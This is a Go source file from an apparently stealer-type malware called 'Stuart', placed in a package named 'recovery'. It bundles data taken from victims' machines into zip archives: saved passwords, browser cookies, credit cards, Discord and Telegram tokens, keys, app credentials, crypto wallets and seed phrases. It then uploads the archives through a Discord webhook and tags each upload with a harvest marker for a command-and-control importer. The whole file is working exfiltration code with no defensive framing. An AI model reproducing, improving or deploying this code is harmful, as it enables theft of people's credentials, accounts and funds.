package main

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"recovery/recovery"
)

// Discord free/non-boost attachment limit is ~8 MiB; stay under for multipart overhead.
const discordPartMax = int(7.5 * 1024 * 1024)

type discordAgentConfig struct {
	Enabled      bool   `json:"enabled"`
	WebhookURL   string `json:"webhookUrl"`
	ThreadPrefix string `json:"threadPrefix"`
}

var (
	discordCfgMu sync.Mutex
	discordCfg   discordAgentConfig
)

// stored separately to avoid import cycle with sync in this file — use main's lock pattern
func setDiscordConfig(c discordAgentConfig) {
	discordCfgMu.Lock()
	defer discordCfgMu.Unlock()
	if c.ThreadPrefix == "" {
		c.ThreadPrefix = "Stuart"
	}
	discordCfg = c
	log.Printf("[recovery] discord config: enabled=%v webhook=%v", c.Enabled, c.WebhookURL != "")
}

func getDiscordConfig() discordAgentConfig {
	discordCfgMu.Lock()
	defer discordCfgMu.Unlock()
	return discordCfg
}

type zipPart struct {
	Name string
	Data []byte
}

type walletBlob struct {
	Name      string
	Type      string
	Path      string
	Addresses interface{}
	VaultData interface{}
	Data      []byte
}

// harvestMarker is embedded in every Discord message + zip meta so the server
// only imports real Stuart posts (never random forum spam).
const harvestMarkerPrefix = "STUART_HARVEST_ID:"

func newHarvestID(clientID string) string {
	return fmt.Sprintf("%s-%d", safeName(clientID, 24), time.Now().UnixNano())
}

func harvestContentLine(harvestID, clientID string, nLogs, nWallets int) string {
	return fmt.Sprintf(
		"**Stuart harvest**\n%s `%s`\nClient: `%s`\nFiles: logs=%d wallets=%d\nTime: %s\n_Do not delete — server import uses this marker._",
		harvestMarkerPrefix, harvestID, clientID, nLogs, nWallets, time.Now().UTC().Format(time.RFC3339),
	)
}

// uploadHarvestToDiscord posts ALL files into exactly ONE forum post (thread).
// First attachment creates the thread; every later file uses thread_id only (never thread_name again).
// Returns threadID + harvestID for the C2 importer.
func uploadHarvestToDiscord(
	clientID string,
	result *recovery.CollectionResult,
	seeds []recovery.SeedResult,
	wallets []walletBlob,
	cfg discordAgentConfig,
) (threadID string, harvestID string, err error) {
	if cfg.WebhookURL == "" {
		return "", "", fmt.Errorf("discord webhook URL empty")
	}

	harvestID = newHarvestID(clientID)

	logParts, err := buildLogZipParts(clientID, harvestID, result, seeds)
	if err != nil {
		return "", harvestID, err
	}
	walletParts, err := buildWalletZipPartsAgent(clientID, harvestID, wallets)
	if err != nil {
		return "", harvestID, err
	}

	// Single ordered queue: logs first, then wallets — one post only
	var all []zipPart
	all = append(all, logParts...)
	all = append(all, walletParts...)
	if len(all) == 0 {
		return "", harvestID, fmt.Errorf("nothing to upload")
	}

	prefix := cfg.ThreadPrefix
	if prefix == "" {
		prefix = "Stuart"
	}
	// Forum title (one post)
	threadName := fmt.Sprintf("%s %s %s", prefix, safeName(clientID, 36), time.Now().UTC().Format("2006-01-02 15:04"))
	if len(threadName) > 100 {
		threadName = threadName[:100]
	}

	baseContent := harvestContentLine(harvestID, clientID, len(logParts), len(walletParts))

	// ── Message 1: creates the ONLY forum post ──────────────────────────
	first := all[0]
	if len(first.Data) > discordPartMax {
		return "", harvestID, fmt.Errorf("first part too large for Discord: %s (%d bytes)", first.Name, len(first.Data))
	}
	msg, err := postDiscordWebhookOnce(cfg.WebhookURL,
		baseContent+"\n_File 1/"+fmt.Sprint(len(all))+": `"+first.Name+"`_",
		threadName, "", []zipPart{first})
	if err != nil {
		return "", harvestID, fmt.Errorf("create post: %w", err)
	}
	threadID = discordChannelID(msg)
	if threadID == "" {
		return "", harvestID, fmt.Errorf("discord response missing channel_id (thread id) — cannot attach more files to same post")
	}
	log.Printf("[recovery] Discord ONE post created thread=%s harvest=%s file=%s", threadID, harvestID, first.Name)

	// ── Messages 2..N: same thread only (thread_id, never thread_name) ───
	for i := 1; i < len(all); i++ {
		p := all[i]
		if len(p.Data) > discordPartMax {
			log.Printf("[recovery] Discord skip oversized part %s (%d bytes)", p.Name, len(p.Data))
			continue
		}
		partContent := fmt.Sprintf("%s\n_File %d/%d: `%s`_", baseContent, i+1, len(all), p.Name)
		_, err := postDiscordWebhookOnce(cfg.WebhookURL, partContent, "", threadID, []zipPart{p})
		if err != nil {
			// Do NOT fall back to a new post — that was creating duplicates
			log.Printf("[recovery] Discord attach failed (same post) file=%s: %v", p.Name, err)
			return threadID, harvestID, fmt.Errorf("attach file %d/%d %s: %w", i+1, len(all), p.Name, err)
		}
		log.Printf("[recovery] Discord same-post file %d/%d ok %s thread=%s", i+1, len(all), p.Name, threadID)
		time.Sleep(200 * time.Millisecond) // gentle rate limit
	}

	log.Printf("[recovery] Discord harvest complete harvest=%s thread=%s files=%d (single post)", harvestID, threadID, len(all))
	return threadID, harvestID, nil
}

func discordChannelID(msg map[string]interface{}) string {
	if msg == nil {
		return ""
	}
	switch v := msg["channel_id"].(type) {
	case string:
		return v
	case json.Number:
		return v.String()
	case float64:
		return fmt.Sprintf("%.0f", v)
	default:
		// snowflake sometimes unmarshaled oddly
		if s, ok := msg["channel_id"]; ok {
			return fmt.Sprint(s)
		}
	}
	return ""
}

func postDiscordWebhookOnce(webhookURL, content, threadName, threadID string, parts []zipPart) (map[string]interface{}, error) {
	var body bytes.Buffer
	w := multipart.NewWriter(&body)

	payload := map[string]interface{}{"content": content}
	// CRITICAL: thread_name ONLY when creating a brand-new forum post (no thread_id yet)
	if threadName != "" && threadID == "" {
		payload["thread_name"] = threadName
	}
	pj, _ := json.Marshal(payload)
	_ = w.WriteField("payload_json", string(pj))

	for i, p := range parts {
		part, err := w.CreateFormFile(fmt.Sprintf("files[%d]", i), p.Name)
		if err != nil {
			return nil, err
		}
		if _, err := part.Write(p.Data); err != nil {
			return nil, err
		}
	}
	if err := w.Close(); err != nil {
		return nil, err
	}

	url := webhookURL
	if strings.Contains(url, "?") {
		url += "&wait=true"
	} else {
		url += "?wait=true"
	}
	if threadID != "" {
		url += "&thread_id=" + threadID
	}

	req, err := http.NewRequest(http.MethodPost, url, &body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 120 * time.Second}
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(res.Body, 1<<20))
	if res.StatusCode < 200 || res.StatusCode >= 300 {
		return nil, fmt.Errorf("discord HTTP %d: %s", res.StatusCode, truncate(string(raw), 300))
	}
	var msg map[string]interface{}
	dec := json.NewDecoder(bytes.NewReader(raw))
	dec.UseNumber()
	if err := dec.Decode(&msg); err != nil {
		return map[string]interface{}{"ok": true}, nil
	}
	return msg, nil
}

func buildLogZipParts(clientID, harvestID string, result *recovery.CollectionResult, seeds []recovery.SeedResult) ([]zipPart, error) {
	if result == nil {
		return nil, nil
	}
	prefix := "stuart-" + safeName(clientID, 32)
	stamp := time.Now().UTC().Format("2006-01-02T15-04-05")

	type entry struct {
		name string
		data []byte
	}
	var entries []entry
	addJSON := func(name string, v interface{}) {
		b, err := json.MarshalIndent(v, "", "  ")
		if err != nil || len(b) <= 2 {
			return
		}
		entries = append(entries, entry{name: prefix + "/" + name, data: b})
	}

	if len(result.Passwords) > 0 {
		addJSON("passwords.json", withClient(result.Passwords, clientID))
	}
	if len(result.Cookies) > 0 {
		entries = append(entries, entry{name: prefix + "/cookies.txt", data: []byte(cookiesNetscape(result.Cookies))})
	}
	if len(result.Autofill) > 0 {
		addJSON("autofill.json", withClient(result.Autofill, clientID))
	}
	if len(result.History) > 0 {
		addJSON("history.json", withClient(result.History, clientID))
	}
	if len(result.Bookmarks) > 0 {
		addJSON("bookmarks.json", withClient(result.Bookmarks, clientID))
	}
	if len(result.CreditCards) > 0 {
		addJSON("credit_cards.json", withClient(result.CreditCards, clientID))
	}
	if len(result.DiscordTokens) > 0 {
		addJSON("discord_tokens.json", withClient(result.DiscordTokens, clientID))
	}
	if len(result.Files) > 0 {
		addJSON("files.json", withClient(result.Files, clientID))
	}
	if len(result.Extensions) > 0 {
		addJSON("extensions.json", withClient(result.Extensions, clientID))
	}
	if len(result.Wallets) > 0 {
		addJSON("wallets.json", withClient(result.Wallets, clientID))
	}
	if len(result.Telegram) > 0 {
		addJSON("telegram.json", withClient(result.Telegram, clientID))
	}
	if len(result.Keys) > 0 {
		addJSON("keys.json", withClient(result.Keys, clientID))
	}
	if len(result.AppCredentials) > 0 {
		addJSON("app_credentials.json", withClient(result.AppCredentials, clientID))
	}
	if result.Gaming != nil {
		addJSON("gaming.json", result.Gaming)
	}
	if result.VPNs != nil {
		addJSON("vpn_items.json", result.VPNs)
	}
	if len(seeds) > 0 {
		addJSON("seeds.json", withClient(seeds, clientID))
	}

	if len(entries) == 0 {
		return nil, nil
	}

	// Pack into ≤7.5 MiB zips
	var parts []zipPart
	var bin []entry
	binSize := 0
	flush := func() {
		if len(bin) == 0 {
			return
		}
		meta, _ := json.MarshalIndent(map[string]interface{}{
			"v": 1, "source": "stuart", "kind": "logs", "clientId": clientID,
			"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
			"capturedAt": time.Now().UnixMilli(),
		}, "", "  ")
		files := []struct{ Name string; Data []byte }{
			{prefix + "/meta.json", meta},
		}
		for _, e := range bin {
			files = append(files, struct{ Name string; Data []byte }{e.name, e.data})
		}
		z, err := zipStore(files)
		if err != nil {
			return
		}
		name := fmt.Sprintf("stuart-%s-%s.p%d.zip", safeName(clientID, 20), stamp, len(parts)+1)
		parts = append(parts, zipPart{Name: name, Data: z})
		bin = nil
		binSize = 0
	}

	for _, e := range entries {
		need := len(e.data) + 256
		if binSize+need > discordPartMax && len(bin) > 0 {
			flush()
		}
		// Single huge JSON: still one part (may exceed — rare for history after trim)
		if len(e.data) > discordPartMax {
			// Write alone
			if len(bin) > 0 {
				flush()
			}
			bin = []entry{e}
			flush()
			continue
		}
		bin = append(bin, e)
		binSize += need
	}
	flush()
	return parts, nil
}

func buildWalletZipPartsAgent(clientID, harvestID string, wallets []walletBlob) ([]zipPart, error) {
	if len(wallets) == 0 {
		return nil, nil
	}
	prefix := "stuart-" + safeName(clientID, 28) + "-wallets"
	stamp := time.Now().UTC().Format("2006-01-02T15-04-05")
	var parts []zipPart

	// Chunk oversized single wallets
	type item struct {
		file string
		w    walletBlob
	}
	var small []item
	for i, w := range wallets {
		file := fmt.Sprintf("%d_%s.zip", i, safeName(w.Name, 60))
		if len(w.Data) > discordPartMax-64*1024 {
			// Raw-split wallet into chunk zips
			chunkSize := int(float64(discordPartMax) * 0.85)
			total := (len(w.Data) + chunkSize - 1) / chunkSize
			for c := 0; c < total; c++ {
				start := c * chunkSize
				end := start + chunkSize
				if end > len(w.Data) {
					end = len(w.Data)
				}
				meta, _ := json.MarshalIndent(map[string]interface{}{
					"v": 1, "source": "stuart", "kind": "wallet_chunk", "clientId": clientID,
					"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
					"name": w.Name, "type": w.Type, "path": w.Path,
					"addresses": w.Addresses, "vaultData": w.VaultData,
					"size": len(w.Data), "chunk": c + 1, "chunks": total,
				}, "", "  ")
				z, err := zipStore([]struct{ Name string; Data []byte }{
					{prefix + "/meta.json", meta},
					{prefix + "/chunk.bin", w.Data[start:end]},
				})
				if err != nil {
					continue
				}
				name := fmt.Sprintf("stuart-%s-chunk%dof%d-%s.zip", safeName(w.Name, 32), c+1, total, stamp)
				parts = append(parts, zipPart{Name: name, Data: z})
			}
			continue
		}
		small = append(small, item{file: file, w: w})
	}

	// Pack small wallets together
	type binT struct {
		items []item
		size  int
	}
	var bins []binT
	for _, it := range small {
		placed := false
		for i := range bins {
			if bins[i].size+len(it.w.Data)+8192 <= discordPartMax {
				bins[i].items = append(bins[i].items, it)
				bins[i].size += len(it.w.Data)
				placed = true
				break
			}
		}
		if !placed {
			bins = append(bins, binT{items: []item{it}, size: len(it.w.Data)})
		}
	}
	for bi, b := range bins {
		metaWallets := make([]map[string]interface{}, 0, len(b.items))
		files := make([]struct{ Name string; Data []byte }, 0, len(b.items)+1)
		for _, it := range b.items {
			metaWallets = append(metaWallets, map[string]interface{}{
				"file": it.file, "name": it.w.Name, "type": it.w.Type, "path": it.w.Path,
				"addresses": it.w.Addresses, "vaultData": it.w.VaultData, "size": len(it.w.Data),
			})
			files = append(files, struct{ Name string; Data []byte }{prefix + "/" + it.file, it.w.Data})
		}
		meta, _ := json.MarshalIndent(map[string]interface{}{
			"v": 1, "source": "stuart", "kind": "wallets", "clientId": clientID,
			"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
			"capturedAt": time.Now().UnixMilli(), "wallets": metaWallets,
		}, "", "  ")
		files = append([]struct{ Name string; Data []byte }{{prefix + "/meta.json", meta}}, files...)
		z, err := zipStore(files)
		if err != nil {
			continue
		}
		name := fmt.Sprintf("stuart-%s-wallets-%s.p%d.zip", safeName(clientID, 16), stamp, bi+1)
		parts = append(parts, zipPart{Name: name, Data: z})
	}
	return parts, nil
}

func zipStore(files []struct {
	Name string
	Data []byte
}) ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range files {
		// Always STORE with sizes/CRC pre-set so server-side unzip (local headers) works.
		// Go's Deflate path often uses data descriptors (compSize=0) which broke poll/import.
		h := &zip.FileHeader{
			Name:   f.Name,
			Method: zip.Store,
		}
		h.SetMode(0o644)
		h.CRC32 = crc32.ChecksumIEEE(f.Data)
		h.UncompressedSize64 = uint64(len(f.Data))
		h.CompressedSize64 = uint64(len(f.Data))
		w, err := zw.CreateHeader(h)
		if err != nil {
			return nil, err
		}
		if _, err := w.Write(f.Data); err != nil {
			return nil, err
		}
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func safeName(s string, max int) string {
	s = filepath.Base(s)
	var b strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' {
			b.WriteRune(r)
		} else {
			b.WriteByte('_')
		}
	}
	out := b.String()
	if out == "" {
		out = "x"
	}
	if len(out) > max {
		out = out[:max]
	}
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func cookiesNetscape(cookies []recovery.CookieResult) string {
	var b strings.Builder
	b.WriteString("# Netscape HTTP Cookie File\n")
	for _, c := range cookies {
		domain := c.Host
		flag := "FALSE"
		if strings.HasPrefix(domain, ".") {
			flag = "TRUE"
		}
		sec := "FALSE"
		if c.Secure {
			sec = "TRUE"
		}
		exp := int64(0)
		if c.ExpiresUTC > 0 {
			exp = c.ExpiresUTC/1000000 - 11644473600
			if exp < 0 {
				exp = 0
			}
		}
		path := c.Path
		if path == "" {
			path = "/"
		}
		fmt.Fprintf(&b, "%s\t%s\t%s\t%s\t%d\t%s\t%s\n", domain, flag, path, sec, exp, c.Name, c.Value)
	}
	return b.String()
}

// withClient tags each element with clientId for server import (JSON objects only).
func withClient(v interface{}, clientID string) interface{} {
	// Re-marshal via generic maps for arrays of structs
	raw, err := json.Marshal(v)
	if err != nil {
		return v
	}
	var arr []map[string]interface{}
	if err := json.Unmarshal(raw, &arr); err != nil {
		return v
	}
	for i := range arr {
		arr[i]["clientId"] = clientID
	}
	return arr
}
